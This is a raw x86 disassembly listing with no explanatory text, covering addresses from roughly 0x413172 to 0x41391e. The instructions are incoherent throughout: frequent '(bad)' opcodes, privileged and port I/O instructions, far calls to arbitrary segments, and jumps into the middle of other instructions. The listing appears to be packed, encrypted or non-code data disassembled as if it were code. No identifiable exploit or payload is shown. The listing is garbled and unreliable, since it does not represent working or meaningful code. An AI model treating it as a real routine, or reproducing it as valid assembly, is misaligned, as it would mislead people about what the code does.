  413172:	jbe    0x4131a8
  413174:	xor    DWORD PTR ds:0x2af9ee44,esi
  41317a:	sbb    eax,0xbca8c085
  41317f:	xor    DWORD PTR ss:0x32e84195,esi
  413186:	icebp  
  413187:	(bad)  
  413189:	icebp  
  41318a:	sub    edx,DWORD PTR [esi+0x17]
  41318d:	out    dx,al
  41318e:	pushf  
  41318f:	add    eax,0x89
  413194:	add    BYTE PTR [eax],al
  413196:	cmc    
  413197:	cmp    eax,DWORD PTR [edx]
  413199:	add    BYTE PTR [ebp-0x7d],dh
  41319c:	shl    DWORD PTR ds:0xfd31eb7c,0x88
  4131a3:	xlat   BYTE PTR ds:[ebx]
  4131a4:	idiv   BYTE PTR [edi]
  4131a6:	jne    0x41320e
  4131a8:	les    esi,FWORD PTR [eax+ebp*2-0x3c]
  4131ac:	out    dx,eax
  4131ad:	pop    ss
  4131ae:	sub    ax,WORD PTR [edi+eax*4]
  4131b2:	cmp    edi,edi
  4131b4:	mul    edi
  4131b6:	dec    eax
  4131b7:	add    eax,DWORD PTR fs:[eax]
  4131ba:	(bad)  
  4131bb:	fwait
  4131bc:	sbb    eax,0x1d3421f3
  4131c1:	repz jb 0x413223
  4131c4:	ja     0x4131c5
  4131c6:	call   0x8c89:0x9dc68eeb
  4131cd:	dec    DWORD PTR [edx+0x5924404e]
  4131d3:	sti    
  4131d4:	rol    DWORD PTR [ecx+edx*2-0x50],0x1
  4131d9:	xchg   ecx,esp
  4131db:	mov    edi,0x21ee81d
  4131e0:	sbb    bl,0x60
  4131e3:	sbb    DWORD PTR [eax+edx*2],esp
  4131e6:	xchg   DWORD PTR [edx],esi
  4131e8:	aas    
  4131e9:	jbe    0x4131c4
  4131eb:	add    esp,edi
  4131ed:	xchg   cl,cl
  4131ef:	push   ds
  4131f0:	or     eax,DWORD PTR [eax]
  4131f2:	jo     0x413264
  4131f4:	daa    
  4131f5:	xor    BYTE PTR ds:0xc2df4e,0x0
  4131fc:	add    BYTE PTR [eax],al
  4131fe:	add    BYTE PTR [ecx+0x7505071e],bh
  413204:	add    ah,bh
  413206:	sbb    al,0x93
  413208:	(bad)  
  413209:	in     eax,dx
  41320a:	mov    edx,ecx
  41320c:	add    edi,esp
  41320e:	add    edi,edx
  413210:	gs ret 
  413212:	sti    
  413213:	std    
  413214:	cmp    al,0xeb
  413216:	jmp    0x413249
  413218:	retf   0x3e7
  41321b:	icebp  
  41321c:	shl    esi,0x7f
  41321f:	push   cs
  413220:	add    ah,bh
  413222:	add    edi,esp
  413224:	repz jmp 0x6c3bcb61
  41322a:	inc    esi
  41322b:	ins    DWORD PTR es:[edi],dx
  41322c:	xor    bh,BYTE PTR [edi-0x18fd01ad]
  413232:	jg     0x4131e9
  413234:	dec    esi
  413235:	dec    esi
  413236:	mov    WORD PTR [ecx],?
  413238:	push   ds
  413239:	aad    0x83
  41323b:	cmp    DWORD PTR [esi],ebx
  41323d:	fld    QWORD PTR [ebx]
  41323f:	sub    edi,ebx
  413241:	popa   
  413242:	inc    edx
  413243:	jno    0x4131ce
  413245:	addr16 jae 0x4131ea
  413248:	aam    0xe7
  41324a:	imul   ebp,ebp,0xfffffff0
  41324d:	out    0x3,al
  41324f:	and    eax,0x65f7f4d5
  413254:	inc    edx
  413255:	out    0x80,eax
  413257:	mov    ch,0x4d
  413259:	mov    ebx,0xfffe308e
  41325e:	popa   
  41325f:	inc    BYTE PTR [edx+0xe8ff]
  413265:	add    BYTE PTR [eax],al
  413267:	add    BYTE PTR [esi-0x77],dh
  41326a:	inc    esp
  41326b:	or     eax,0xb9ff6899
  413270:	dec    esi
  413271:	xor    BYTE PTR [edx+0x56],bh
  413274:	das    
  413275:	add    al,0xd0
  413278:	inc    esp
  413279:	fcom   QWORD PTR [ebp-0x76]
  41327c:	jns    0x413280
  41327e:	test   BYTE PTR [ecx],ch
  413280:	stos   BYTE PTR es:[edi],al
  413281:	clc    
  413282:	std    
  413283:	lods   eax,DWORD PTR ds:[esi]
  413284:	xchg   edx,eax
  413285:	in     al,dx
  413286:	jg     0x413235
  413288:	mov    ch,ah
  41328a:	add    bl,BYTE PTR [ebx+0x110bea0b]
  413290:	or     esp,DWORD PTR [eax+0x4201e8ff]
  413296:	add    al,0x27
  413298:	dec    edx
  413299:	push   ds
  41329a:	adc    eax,0x2456f6e8
  41329f:	xlat   BYTE PTR ds:[ebx]
  4132a0:	jne    0x4132f1
  4132a2:	adc    al,0x62
  4132a4:	mov    ch,0x89
  4132a6:	into   
  4132a7:	add    DWORD PTR [ecx],ebx
  4132a9:	mov    edi,edi
  4132ab:	call   0x5adb3eb
  4132b0:	(bad)  [ebx]
  4132b2:	(bad)  
  4132b3:	sub    eax,0x69feed95
  4132b8:	xor    eax,0x8201181e
  4132bd:	sbb    DWORD PTR [esi-0x1b],ebp
  4132c0:	ins    DWORD PTR es:[edi],dx
  4132c1:	xchg   BYTE PTR [ecx-0x4a],dl
  4132c4:	int3   
  4132c5:	aad    0x89
  4132c7:	push   cs
  4132c8:	jne    0x413332
  4132ca:	add    bh,BYTE PTR [edi]
  4132cc:	add    BYTE PTR [eax],al
  4132ce:	add    BYTE PTR [eax],al
  4132d0:	add    BYTE PTR [ecx+0x76e9c6c4],dl
  4132d6:	jle    0x413298
  4132d8:	sbb    eax,0xc544bd92
  4132dd:	test   esp,edx
  4132df:	xor    al,BYTE PTR [eax]
  4132e1:	xlat   BYTE PTR ds:[ebx]
  4132e2:	neg    BYTE PTR [ebx+0x24]
  4132e5:	mov    ds:0x1a8b0343,eax
  4132ea:	out    0xa7,al
  4132ec:	xchg   BYTE PTR [ebp-0x1],bl
  4132ef:	xchg   BYTE PTR [esi+0x50],al
  4132f2:	jle    0x4132ec
  4132f4:	xor    bh,BYTE PTR [ecx]
  4132f6:	idiv   BYTE PTR [esi-0x8]
  4132f9:	inc    ebp
  4132fa:	sub    al,0x40
  4132fc:	inc    DWORD PTR [ecx-0x29]
  4132ff:	adc    BYTE PTR [eax+0x4c],al
  413302:	es inc esp
  413304:	and    al,0x18
  413306:	in     al,dx
  413307:	jg     0x4132d4
  413309:	add    dh,bh
  41330b:	jne    0x41333c
  41330d:	add    dl,BYTE PTR [edx]
  41330f:	push   0x3
  413311:	xor    al,0xe7
  413313:	push   0x84b97bfa
  413318:	shl    cl,0xd1
  41331b:	push   eax
  41331c:	push   edi
  41331d:	das    
  41331e:	mov    edi,0xb9765be8
  413323:	sti    
  413324:	test   BYTE PTR [ebx+eax*2+0xa],cl
  413328:	push   ebx
  413329:	adc    esp,DWORD PTR [ebp+0x2]
  41332c:	pop    eax
  41332d:	je     0x41336a
  41332f:	cli    
  413330:	(bad)  
  413331:	fstp   TBYTE PTR [ecx+0x1811]
  413337:	add    BYTE PTR [eax],al
  413339:	add    bh,bl
  41333b:	add    BYTE PTR ds:[ecx-0xe3dd60],cl
  413342:	(bad)  
  413343:	out    0x49,al
  413345:	arpl   bp,cx
  413347:	(bad)  
  413348:	push   ebp
  413349:	call   0x3e90e1
  41334e:	pop    ss
  41334f:	inc    edx
  413350:	add    al,0x5
  413352:	inc    eax
  413353:	add    BYTE PTR [eax],al
  413355:	add    BYTE PTR [ecx+edi*4+0x11],bl
  413359:	sbb    al,0x9e
  41335b:	add    BYTE PTR ds:[ebx-0x76ffdb8b],cl
  413362:	cmc    
  413363:	pop    eax
  413364:	add    al,BYTE PTR [eax]
  413366:	jne    0x413359
  413368:	inc    ebx
  413369:	jne    0x4133c9
  41336b:	jmp    0xb7ca30a1
  413370:	hlt    
  413371:	aas    
  413372:	jne    0x4133da
  413374:	ror    DWORD PTR ds:0xfdd631f8,0x5a
  41337b:	xor    eax,0xdfba8905
  413380:	add    al,0xc1
  413382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413383:	inc    eax
  413384:	out    dx,al
  413385:	sbb    esp,DWORD PTR [edi-0x65]
  413388:	add    DWORD PTR [ebp-0x65],ebx
  41338b:	outs   dx,BYTE PTR ds:[esi]
  41338c:	cmp    al,0x89
  41338e:	sbb    BYTE PTR [edi-0x3c],dh
  413391:	sub    DWORD PTR [ecx-0x34fdfff9],0xe30dd254
  41339b:	ror    DWORD PTR [esi+0x2c],cl
  41339e:	add    BYTE PTR [eax],al
  4133a0:	add    BYTE PTR [eax],al
  4133a2:	add    dh,dh
  4133a4:	repnz or dh,BYTE PTR [ecx+ebp*2+0x5c]
  4133a9:	fimul  DWORD PTR [ebx]
  4133ab:	mov    BYTE PTR [esi+0x4d333947],ah
  4133b1:	or     al,0x80
  4133b3:	ins    DWORD PTR es:[edi],dx
  4133b4:	fimul  DWORD PTR [ebx]
  4133b6:	jae    0x413428
  4133b8:	test   DWORD PTR [ebx],eax
  4133ba:	pop    eax
  4133bb:	into   
  4133bc:	fcom   QWORD PTR [edx]
  4133be:	shl    BYTE PTR ds:0x7be90252,0xa0
  4133c5:	add    bh,bh
  4133c7:	retf   0x1db
  4133ca:	xor    DWORD PTR [ebp-0x9c416e5],esi
  4133d0:	ret    0x7c0a
  4133d3:	imul   ebx,DWORD PTR [ebx+ebx*8+0xc],0x2b
  4133d8:	les    eax,FWORD PTR [ecx+0x1b0270f7]
  4133de:	(bad)  
  4133df:	sbb    cl,bl
  4133e1:	fs add al,0x75
  4133e4:	add    bl,BYTE PTR [ebx]
  4133e6:	cld    
  4133e7:	or     ecx,ebx
  4133e9:	(bad)  
  4133ea:	and    esi,DWORD PTR [ebp+0x2]
  4133ed:	add    eax,0xd0cafbf8
  4133f2:	and    esi,DWORD PTR [ebp+0x2]
  4133f5:	imul   bh
  4133f7:	xor    DWORD PTR [edx+ebp*8],eax
  4133fa:	add    esi,DWORD PTR [ebp+0x2]
  4133fd:	push   edx
  4133fe:	enter  0xc2a4,0x20
  413402:	inc    eax
  413403:	cdq    
  413404:	(bad)  
  413405:	in     eax,0x70
  413407:	add    BYTE PTR [eax],al
  413409:	add    BYTE PTR [eax],al
  41340b:	add    BYTE PTR ds:0x848e4242,dh
  413411:	ret    0xc1a5
  413414:	ins    DWORD PTR es:[edi],dx
  413415:	add    ch,BYTE PTR [edi-0x14d94e7e]
  41341b:	add    DWORD PTR [eax-0x68],edi
  41341e:	fist   WORD PTR [eax-0x77]
  413421:	test   DWORD PTR [eax],esp
  413423:	or     ah,BYTE PTR [ecx-0xb3c25cb]
  413429:	retf   0x50e4
  41342c:	xchg   esi,eax
  41342d:	leave  
  41342e:	jmp    0xe743a937
  413433:	jmp    0x1169:0xa008599
  41343a:	jne    0x413458
  41343c:	hlt    
  41343d:	retf   0x55dc
  413440:	xchg   ecx,eax
  413441:	and    eax,0xffffff80
  413444:	jne    0x413448
  413446:	out    0x4f,eax
  413448:	ins    DWORD PTR es:[edi],dx
  413449:	adc    eax,0x1e
  41344c:	xchg   ebp,eax
  41344d:	add    ah,bh
  41344f:	push   ebp
  413450:	cdq    
  413451:	add    eax,0x2c
  413454:	xchg   ebp,eax
  413455:	add    ah,bh
  413457:	push   esi
  413458:	xchg   ecx,eax
  413459:	leave  
  41345a:	add    bl,ch
  41345c:	ja     0x413460
  41345e:	add    cl,ch
  413460:	(bad)  
  413461:	pop    ds
  413462:	xor    DWORD PTR [ecx-0x12dbb987],ebp
  413468:	jnp    0x4134df
  41346a:	shr    BYTE PTR [ecx],0x9e
  41346d:	and    ebp,eax
  41346f:	jmp    0x413471
  413471:	add    BYTE PTR [eax],al
  413473:	add    BYTE PTR [eax],al
  413475:	jns    0x413479
  413477:	add    cl,ch
  413479:	(bad)  
  41347a:	jmp    0x4134ac
  41347c:	test   eax,0x2d38f85f
  413481:	xchg   ebp,eax
  413482:	cli    
  413483:	jne    0x413467
  413485:	test   BYTE PTR [edx-0x3],0xf4
  413489:	lds    eax,FWORD PTR [ebx]
  41348b:	push   0xffffffeb
  41348d:	mov    ds,ecx
  41348f:	add    DWORD PTR [edx],ebx
  413491:	xor    DWORD PTR [ebx-0x79],eax
  413494:	jmp    0x4134fd
  413496:	ret    0x2b40
  413499:	jb     0x41349d
  41349b:	push   ebx
  41349c:	jb     0x4134b8
  41349e:	and    ah,0x31
  4134a1:	xor    edx,DWORD PTR [bp-0x6a]
  4134a5:	mov    edi,cs
  4134a7:	gs jmp 0x11584d57
  4134ad:	xor    edi,DWORD PTR [ebp-0x25001701]
  4134b3:	cmp    esp,0xffffffb2
  4134b6:	add    DWORD PTR [eax+0x12],eax
  4134b9:	lods   eax,DWORD PTR ds:[esi]
  4134ba:	ficomp DWORD PTR [eax]
  4134bc:	sub    eax,0x29840279
  4134c1:	cmp    cl,BYTE PTR [esi]
  4134c3:	push   0xfffffff8
  4134c5:	enter  0x67f3,0xfb
  4134c9:	add    dl,BYTE PTR ss:[eax-0x22]
  4134cd:	loop   0x4134fe
  4134cf:	adc    ch,BYTE PTR [ecx]
  4134d1:	jno    0x41354c
  4134d3:	xor    ebp,ebp
  4134d5:	lds    ecx,FWORD PTR [edi]
  4134d7:	add    BYTE PTR [eax],al
  4134d9:	add    BYTE PTR [eax],al
  4134db:	add    BYTE PTR [eax],al
  4134dd:	add    bh,dh
  4134df:	jle    0x4134f0
  4134e1:	add    BYTE PTR [edx+edx*1-0x1d1fca05],bl
  4134e8:	aas    
  4134e9:	add    bl,dl
  4134eb:	mov    al,ds:0x38d02bb
  4134f0:	add    bl,ch
  4134f2:	mov    ds:0x9cca37db,al
  4134f7:	add    ecx,DWORD PTR [edi-0x1]
  4134fa:	test   eax,0x8c43e4b7
  4134ff:	mov    dh,0xd6
  413501:	cmp    ebx,DWORD PTR [ebx]
  413503:	xor    ch,dh
  413505:	push   ebp
  413506:	hlt    
  413507:	jecxz  0x413582
  413509:	call   ebx
  41350b:	icebp  
  41350c:	mov    edi,0x5718325f
  413511:	mov    edi,DWORD PTR [ecx+0x5c04c217]
  413517:	and    BYTE PTR [ecx+0x7d7a786c],cl
  41351d:	in     al,dx
  41351e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41351f:	add    al,BYTE PTR [eax]
  413521:	add    BYTE PTR [edi],cl
  413523:	repnz (bad) 
  413525:	push   ebx
  413526:	arpl   di,bx
  413528:	gs adc cl,ah
  41352b:	add    dl,BYTE PTR [eax-0x1]
  41352e:	sbb    DWORD PTR [ebx+0x12],esp
  413531:	inc    eax
  413532:	sbb    al,0x59
  413534:	std    
  413535:	addr16 sbb eax,0x7419363f
  41353b:	adc    eax,0x7c0c01ca
  413540:	inc    ecx
  413541:	ins    BYTE PTR es:[edi],dx
  413542:	add    BYTE PTR [eax],al
  413544:	add    BYTE PTR [eax],al
  413546:	add    BYTE PTR [edi+0x2f0871c1],dh
  41354c:	ret    
  41354d:	inc    eax
  41354e:	jmp    0x41383c
  413553:	call   0x6813:0x58458911
  41355a:	and    esi,DWORD PTR [ebp-0x1f]
  41355d:	pop    ds
  41355e:	std    
  41355f:	int    0xda
  413561:	(bad)  
  413562:	(bad)  
  413563:	mov    edx,0xae8e8e55
  413568:	(bad)  
  413569:	aam    0xe8
  41356b:	cmp    BYTE PTR [edx+0x2b780001],ch
  413571:	add    al,BYTE PTR [eax]
  413573:	jne    0x413568
  413575:	out    dx,eax
  413576:	dec    edi
  413577:	es pop esi
  413579:	dec    esi
  41357a:	inc    esp
  41357b:	mul    BYTE PTR [eax+0x286ce8d4]
  413581:	add    DWORD PTR [eax],eax
  413583:	lock cwde 
  413585:	push   ebx
  413586:	sbb    edi,esi
  413588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413589:	xor    DWORD PTR [eax-0xb],ebp
  41358c:	jne    0x4135ce
  41358e:	add    al,dh
  413590:	push   bp
  413592:	sti    
  413593:	pop    edx
  413594:	gs xor eax,ebp
  413597:	cs jp  0x41359b
  41359a:	add    al,dh
  41359c:	sbb    eax,DWORD PTR [ebx+edx*4]
  41359f:	xor    eax,0x6c73bef2
  4135a4:	enter  0x66c1,0xfc
  4135a8:	push   bp
  4135aa:	sti    
  4135ab:	add    BYTE PTR [eax],al
  4135ad:	add    BYTE PTR [eax],al
  4135af:	add    BYTE PTR [edx],ch
  4135b1:	adc    eax,0xdb74ee9a
  4135b6:	add    DWORD PTR [ebx-0x227aa10],ecx
  4135bc:	adc    dl,BYTE PTR [ecx+edi*8+0x3f]
  4135c0:	mov    esp,0xf88bd76e
  4135c5:	jg     0x41359d
  4135c7:	std    
  4135c8:	cli    
  4135c9:	imul   edx,esp,0x13
  4135cc:	sub    eax,0xf80041a9
  4135d1:	pop    esi
  4135d2:	push   ebp
  4135d3:	sti    
  4135d4:	loop   0x4135b2
  4135d6:	xor    bh,ch
  4135d8:	add    BYTE PTR [edx],0xc7
  4135db:	not    BYTE PTR [edx+0x45497002]
  4135e1:	(bad)  
  4135e3:	mov    esi,0xc463cdc2
  4135e8:	inc    ecx
  4135e9:	sub    BYTE PTR [esi],bl
  4135eb:	and    DWORD PTR [esi],0x759c7fda
  4135f1:	add    ah,bh
  4135f3:	(bad)  [eax-0x1b]
  4135f6:	out    0x3,eax
  4135f8:	in     al,dx
  4135f9:	pop    ss
  4135fa:	add    esi,edi
  4135fc:	push   edx
  4135fd:	add    ah,BYTE PTR [edx-0x44]
  413600:	jne    0x413604
  413602:	out    0x36,eax
  413604:	adc    BYTE PTR [edi],0x8b
  413607:	call   0xbac73840
  41360c:	dec    BYTE PTR [eax-0x3f]
  41360f:	push   cs
  413610:	xor    BYTE PTR [edi-0x49],dl
  413613:	jle    0x413615
  413615:	add    BYTE PTR [eax],al
  413617:	add    BYTE PTR [eax],al
  413619:	mov    dh,0x52
  41361b:	pop    esp
  41361c:	dec    eax
  41361d:	jne    0x41361f
  41361f:	jo     0x41366a
  413621:	vpaddq ymm2,ymm6,YMMWORD PTR [ebx-0x2]
  413626:	xchg   bl,dl
  413628:	rol    BYTE PTR [eax-0x33],1
  41362b:	mov    bh,0x5d
  41362d:	cmp    bh,BYTE PTR [esi-0x54]
  413630:	xchg   ebp,eax
  413632:	jg     0x4135d8
  413634:	fcmovnb st,st(5)
  413636:	ficom  DWORD PTR [edi-0x65fd8a8a]
  41363c:	shl    BYTE PTR [esi-0x32],cl
  41363f:	or     eax,DWORD PTR [edi+0x75]
  413642:	int    0x35
  413644:	wrmsr  
  413646:	push   esi
  413647:	xor    DWORD PTR [ebx],esi
  413649:	add    BYTE PTR [edi+0x7b],dl
  41364c:	fcmovne st,st(6)
  41364e:	dec    ebp
  41364f:	push   es
  413650:	shl    DWORD PTR [edx+eax*8-0x390bd163],cl
  413657:	add    BYTE PTR [ebp+0x21],bh
  41365a:	rol    BYTE PTR [ecx+ebp*8],0x9d
  41365e:	jnp    0x41364c
  413660:	cmp    BYTE PTR [edx+0x65725534],cl
  413666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413667:	fld    TBYTE PTR [edx]
  413669:	jns    0x41367e
  41366b:	fnstcw WORD PTR [edx]
  41366d:	sbb    BYTE PTR [edx-0x17],0xe7
  413671:	cmp    DWORD PTR [edx],eax
  413673:	push   ecx
  413674:	jb     0x413645
  413676:	(bad)  
  413678:	add    DWORD PTR [ecx+0x2],edi
  41367b:	push   ecx
  41367c:	sbb    al,BYTE PTR [eax]
  41367e:	add    BYTE PTR [eax],al
  413680:	add    BYTE PTR [eax],al
  413682:	cmp    DWORD PTR ds:0x3379281d,ebp
  413688:	mov    BYTE PTR [esi+eiz*4],ah
  41368b:	(bad)  
  41368d:	shl    DWORD PTR [esi+0x2],0x38
  413691:	sub    al,0xa6
  413693:	push   eax
  413694:	or     bl,al
  413696:	cmp    edx,DWORD PTR [eax+0x4]
  413699:	mov    edx,0xba01da36
  41369e:	ss inc ebx
  4136a0:	pop    ebp
  4136a1:	jp     0xd3fdf86a
  4136a7:	fidivr WORD PTR [edi+0x4d]
  4136aa:	push   es
  4136ab:	add    eax,DWORD PTR [eax]
  4136ad:	jmp    0xc3966b3d
  4136b2:	jbe    0x41372b
  4136b4:	cmp    ecx,0x47
  4136b7:	into   
  4136b8:	std    
  4136b9:	cdq    
  4136ba:	into   
  4136bb:	and    DWORD PTR [eax],ecx
  4136bd:	or     eax,DWORD PTR [esi-0x25]
  4136c0:	mov    cl,0x21
  4136c2:	jno    0x4136c6
  4136c4:	mov    ebx,DWORD PTR [esi+ebx*4+0x76e9a88a]
  4136cb:	add    ch,al
  4136cd:	test   al,0xc
  4136cf:	add    eax,DWORD PTR [eax]
  4136d1:	fcmovne st,st(3)
  4136d3:	(bad)  
  4136d4:	(bad)  
  4136d5:	(bad)  
  4136d6:	fdiv   st(7),st
  4136d8:	jg     0x413667
  4136da:	push   ecx
  4136db:	out    dx,eax
  4136dc:	cli    
  4136dd:	(bad)  
  4136de:	jmp    0x4136f0
  4136e0:	mov    DWORD PTR [ebp+0x44],eax
  4136e3:	rcpps  xmm7,xmm7
  4136e6:	add    BYTE PTR [eax],al
  4136e8:	add    BYTE PTR [eax],al
  4136ea:	add    cl,dl
  4136ec:	mov    ds:0x84dc400f,eax
  4136f1:	shl    BYTE PTR [ebp-0x71],0x2e
  4136f5:	hlt    
  4136f6:	add    esp,ecx
  4136f8:	(bad)  
  4136f9:	cli    
  4136fa:	adc    eax,0x3dd440
  4136ff:	sbb    DWORD PTR [ebx-0x4],eax
  413702:	push   eax
  413703:	jmp    FWORD PTR ss:[ecx+0x0]
  413707:	cmp    DWORD PTR [ebx-0x68],eax
  41370a:	push   eax
  41370b:	push   ebx
  41370c:	inc    edi
  41370d:	jns    0x41370b
  41370f:	jmp    0x4136e4
  413711:	cmp    DWORD PTR [eax],edx
  413713:	dec    esp
  413714:	push   es
  413715:	add    eax,0x858acf61
  41371b:	sub    al,0xb2
  41371d:	sti    
  41371e:	dec    DWORD PTR [ebx+ecx*2+0xbf4fc71]
  413725:	pop    DWORD PTR [eax]
  413727:	dec    esp
  413728:	scas   al,BYTE PTR es:[edi]
  413729:	add    dh,BYTE PTR [edx]
  41372b:	pushf  
  41372c:	jp     0x4136ee
  41372e:	je     0x41378a
  413730:	mov    cl,0xbf
  413732:	and    BYTE PTR [edi+0x5ea77203],0xc6
  413739:	pop    ebx
  41373a:	pop    esi
  41373b:	xlat   BYTE PTR ds:[ebx]
  41373c:	xchg   DWORD PTR [edi-0xc51e250],edi
  413742:	mov    ecx,DWORD PTR [esi+eax*4]
  413745:	clc    
  413746:	jmp    eax
  413748:	int    0x82
  41374a:	shl    al,0xf9
  41374d:	dec    edi
  41374e:	inc    DWORD PTR [eax]
  413750:	add    BYTE PTR [eax],al
  413752:	add    BYTE PTR [eax],al
  413754:	add    DWORD PTR [ebx],eax
  413756:	cmovo  esi,DWORD PTR [ebp-0x27]
  41375a:	les    edx,FWORD PTR [ebx-0x12]
  41375d:	int3   
  41375e:	test   ah,ah
  413760:	in     eax,dx
  413761:	push   edi
  413762:	loopne 0x413770
  413764:	inc    esi
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	add    DWORD PTR [ecx+0x18455fbd],ecx
  41376c:	nop
  41376d:	(bad)  
  41376f:	jge    0x413743
  413771:	or     bh,cl
  413773:	jae    0x4137d6
  413775:	das    
  413776:	add    al,0xfd
  413778:	dec    eax
  413779:	leave  
  41377a:	shl    BYTE PTR [ebx+0x69],1
  41377d:	mov    esp,0xadb20856
  413782:	inc    ecx
  413783:	adc    dh,BYTE PTR ds:0xa2f884d9
  413789:	or     eax,0xbfb53208
  41378e:	es cmc 
  413790:	cmp    BYTE PTR [ecx],al
  413792:	add    al,0x0
  413794:	cmc    
  413795:	fdivr  DWORD PTR [edx+0x1]
  413798:	or     ecx,edx
  41379a:	test   BYTE PTR [ecx+edx*2-0x1f],cl
  41379e:	rol    BYTE PTR [ecx-0x302483f],1
  4137a4:	clc    
  4137a5:	pop    ds
  4137a6:	sub    BYTE PTR [eax],cl
  4137a8:	(bad)
  4137ab:	push   0x75
  4137ad:	sbb    ebx,0x2
  4137b0:	jne    0x41378d
  4137b2:	xchg   ecx,eax
  4137b3:	jmp    FWORD PTR [edi+0x5be654]
  4137b9:	add    BYTE PTR [eax],al
  4137bb:	add    BYTE PTR [eax],al
  4137bd:	aaa    
  4137be:	enter  0x5301,0xee
  4137c2:	pop    es
  4137c3:	xor    cl,BYTE PTR [edi+0x0]
  4137c6:	xchg   edi,eax
  4137c7:	leave  
  4137c8:	push   eax
  4137c9:	(bad)  
  4137ca:	sahf   
  4137cb:	stc    
  4137cc:	cld    
  4137cd:	gs adc dh,dh
  4137d0:	aaa    
  4137d1:	xchg   DWORD PTR [ebx+0x3358301],ebx
  4137d7:	pushf  
  4137d8:	pop    es
  4137d9:	inc    edi
  4137da:	ret    0xfe12
  4137dd:	in     eax,dx
  4137de:	aas    
  4137df:	(bad)  
  4137e1:	jae    0x413860
  4137e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e4:	iret   
  4137e5:	cli    
  4137e6:	inc    eax
  4137e7:	jmp    0x41377c
  4137e9:	jmp    0x622f:0x750729ba
  4137f0:	fcomip st,st(4)
  4137f2:	(bad)  
  4137f3:	xlat   BYTE PTR ds:[ebx]
  4137f4:	test   BYTE PTR [esi-0x32],dl
  4137f7:	out    0x36,eax
  4137f9:	test   dl,al
  4137fb:	push   ecx
  4137fc:	add    eax,0x9bcf47ee
  413801:	out    dx,al
  413802:	aas    
  413803:	shl    DWORD PTR [eax+esi*4],cl
  413806:	dec    edi
  413807:	mov    edi,0xbdfa367b
  41380c:	pop    ecx
  41380d:	test   eax,0x86cef7c9
  413812:	sub    bl,cl
  413814:	inc    ebx
  413815:	jne    0x413896
  413817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413818:	pop    ecx
  413819:	jno    0x41382f
  41381b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41381c:	fld    TBYTE PTR [esi+0x7d]
  41381f:	sub    al,0xd8
  413821:	add    BYTE PTR [eax],al
  413823:	add    BYTE PTR [eax],al
  413825:	add    dl,dh
  413827:	add    BYTE PTR [edx+0x49],ah
  41382a:	ins    DWORD PTR es:[edi],dx
  41382b:	jnp    0x41385a
  41382d:	or     BYTE PTR ds:0x37bd1e03,ah
  413833:	(bad)  
  413834:	out    0xce,al
  413836:	loope  0x413856
  413838:	fistp  DWORD PTR [ecx+0x75]
  41383b:	leave  
  41383c:	(bad)  [edi]
  41383e:	gs leave 
  413840:	shl    DWORD PTR [edi],cl
  413842:	gs leave 
  413844:	pop    ss
  413845:	iret   
  413846:	data16 sub bh,cl
  413849:	inc    ebx
  41384a:	jne    0x41381d
  41384c:	pop    ds
  41384d:	jmp    0x413839
  41384f:	rcr    BYTE PTR [edi],1
  413851:	ret    0x271
  413854:	add    BYTE PTR [edi+ebx*4-0xa16952a],bl
  41385b:	inc    esp
  41385c:	adc    BYTE PTR [ecx+0x7210553b],bh
  413862:	lods   al,BYTE PTR ds:[esi]
  413863:	cli    
  413864:	cld    
  413865:	pushf  
  413866:	cli    
  413867:	lds    esi,FWORD PTR [eax]
  413869:	push   cs
  41386a:	in     al,dx
  41386b:	inc    esp
  41386c:	adc    ch,BYTE PTR [ecx+0x74c08576]
  413872:	ins    DWORD PTR es:[edi],dx
  413873:	or     eax,0xfffffff6
  413876:	mov    edi,0xc6a48902
  41387b:	sub    eax,edx
  41387d:	cmc    
  41387e:	jbe    0x4138b3
  413880:	xor    edx,eax
  413882:	outs   dx,BYTE PTR ds:[esi]
  413883:	in     eax,dx
  413884:	(bad)  
  413885:	mov    ah,0x37
  413887:	add    dh,BYTE PTR [ebx+0x17]
  41388a:	add    BYTE PTR [eax],al
  41388c:	add    BYTE PTR [eax],al
  41388e:	add    BYTE PTR [ebx-0x78],ch
  413891:	or     BYTE PTR [edi-0x41a9fdc9],ah
  413897:	popf   
  413898:	lock adc DWORD PTR [ecx],ebp
  41389b:	jno    0x4138a7
  41389d:	sbb    esp,DWORD PTR [ecx+0x1c0042c5]
  4138a3:	cwde   
  4138a4:	jg     0x4138c1
  4138a6:	mov    ecx,0x600042bf
  4138ab:	test   DWORD PTR [ecx+ecx*8+0x1b7f792a],edi
  4138b2:	mov    ch,0x25
  4138b4:	inc    edx
  4138b5:	add    BYTE PTR [edi+0x2adbba6d],ah
  4138bb:	jno    0x413884
  4138bd:	push   ebx
  4138be:	outs   dx,BYTE PTR ds:[esi]
  4138bf:	dec    ebp
  4138c0:	in     al,dx
  4138c1:	adc    DWORD PTR [ecx+0x2d9f2876],ebp
  4138c7:	inc    DWORD PTR [ecx+0x0]
  4138ca:	adc    dh,BYTE PTR [esi]
  4138cc:	push   esp
  4138cd:	sub    cl,al
  4138cf:	ficom  WORD PTR [ebx+0x40]
  4138d2:	add    BYTE PTR [ecx+edi*4],bl
  4138d5:	adc    DWORD PTR [esi+edi*1+0x44],edx
  4138d9:	add    BYTE PTR [ebx],bh
  4138db:	dec    edi
  4138dc:	das    
  4138dd:	adc    DWORD PTR [eax+0x48],ebp
  4138e0:	sub    al,BYTE PTR [eax+0x0]
  4138e3:	int3   
  4138e4:	mov    eax,0x43fea811
  4138e9:	add    BYTE PTR [ebx+0x3f8c50],ah
  4138ef:	mov    esp,0x471
  4138f5:	add    BYTE PTR [eax],al
  4138f7:	add    BYTE PTR [esi],ch
  4138f9:	(bad)  
  4138fa:	out    0x15,eax
  4138fc:	addr16 pop es
  4138fe:	and    al,0x8
  413900:	imul   bl
  413902:	cli    
  413903:	je     0x4138bd
  413905:	rcl    DWORD PTR [eax-0x1],cl
  413908:	ins    DWORD PTR es:[edi],dx
  413909:	mov    ch,0xd0
  41390b:	div    DWORD PTR [ecx+ebx*8+0x1a04f7bd]
  413912:	ret    0x9c08
  413915:	adc    ch,BYTE PTR [edi]
  413917:	(bad)  [edi+edx*8-0x3b]
  41391b:	fisttp QWORD PTR [edi-0x2]
  41391e:	jo     0x413956
